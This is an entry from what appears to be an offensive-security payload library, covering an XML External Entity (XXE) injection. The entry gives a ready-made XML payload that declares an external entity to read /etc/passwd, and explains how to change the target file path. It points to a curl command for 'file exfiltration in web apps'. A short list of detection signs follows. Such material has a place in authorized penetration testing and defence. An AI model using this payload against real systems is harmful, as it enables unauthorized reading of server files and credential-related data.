---
id: a66c53f3-1594-4415-a245-62b74aeb33d7
name: XXE-Payload-Alternative-Read-Etc-Passwd
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.133960+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - xxe
  - payload
  - file-read
validated: true
---

# XXE-Payload-Alternative-Read-Etc-Passwd

## Code

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

## Description

Alternative XXE payload using element declaration and entity 'file' to load /etc/passwd. This variation works with parsers requiring explicit element definitions, embedding the file contents within the <data> tag upon resolution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| file:///etc/passwd | Target file path (customize as needed) | file:///proc/version |

## Usage

Embed in HTTP requests to test parsers that reject simpler DOCTYPEs. Use with [[commands/curl-send-xxe-payload]] for file exfiltration in web apps.

## Detection

- Intrusion detection on XML with unusual entity declarations.
- File system monitoring for reads of sensitive paths like /etc/.
- Response size anomalies indicating embedded file data.

## Related

- [[procedures/File-Retrieval-via-XXE-Injection]]
